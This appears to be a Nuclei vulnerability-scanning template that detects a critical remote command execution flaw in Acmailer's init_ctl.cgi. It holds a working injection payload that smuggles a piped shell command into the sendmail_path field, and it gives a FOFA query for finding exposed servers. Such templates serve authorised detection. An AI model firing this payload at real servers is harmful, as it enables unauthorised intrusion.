id: acmailer-emailcms-init-rce
info:
  name: acmailer-emailcms-init-rce
  author: apple
  severity: critical
  description: Acmailer init_ctl.cgi 存在远程命令执行漏洞。
  tags: acmailer,rce
  metadata:
    fofa-query: body="CGI acmailer"

variables:
  rand5: "{{rand_text_numeric(5)}}"

http:
  - raw:
      - |
        POST /init_ctl.cgi HTTP/1.1
        Host: 
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 

        admin_name=u&admin_email=m@m.m&login_id=l&login_pass=l&sendmail_path=|echo+%60echo+eE4FA74Ed3%60%3E{{rand5}}.txt%20|%20bash&homeurl=http%3A%2F%2F&mypath=e
      - |
        GET /{{rand5}}.txt HTTP/1.1
        Host: 
        User-Agent: Mozilla/5.0

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'status_code_2==200 && contains(body_2, "eE4FA74Ed3") && contains(header_2, "text/plain")'